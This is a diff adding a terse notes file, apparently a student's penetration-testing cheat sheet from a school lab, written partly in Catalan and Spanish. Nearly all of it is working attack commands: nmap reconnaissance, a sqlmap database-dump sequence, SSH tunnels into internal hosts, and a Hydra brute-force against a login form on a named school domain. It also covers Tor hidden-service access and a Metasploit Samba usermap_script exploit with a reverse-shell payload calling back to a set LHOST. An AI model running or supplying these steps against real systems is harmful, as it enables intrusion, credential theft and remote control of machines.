@@ -1,0 +1,24 @@
+nmap -O 192.168.1.45 -T4
+
+/usr/share/sqlmap/txt/common-tables.txt
+
+sqlmap -u “url”  --dbs \ -D especificar data base  --tables \  -D –T tabla –columns \ -D –T –C columna --dump
+
+tunneling (cisco i remote desktop) --> ssh 18smx2d14@users.ies-sabadell.cat -L 8389:192.168.1.95:3389 -L 800:192.168.0.205:80
+proxy tunneling --> ssh 18smx2d14@users.ies-sabadell.cat -D 8888
+
+hydra -L usuaris-simpson -P contras-simpson ies-sabadell.cat http-post-from '/10smx162/usuarios.php:usuari=^USER^&clau=^PASS^:error'
+
+root@kali:/var/lib/tor/hidden_service# more hostname --> 74wg3s4pprkxowtmusjxtedcaeex5wgfaawznlkiroaaievpv2j4vlad.onion
+torify ssh root@5sdfsdfsdcaeex5wgfaawzsdfsdfaievpv2sdgf.onion(a qui hem connecto)
+
+nmap -sV -sC 192.168.1.46
+msfconsole
+search samba
+use exploit/multi/samba/usermap_script
+show payloads
+set payload cmd/unix/reverse
+show options
+set LHOST 10.1.6.44
+set RHOST 192.168.1.46
+exploit
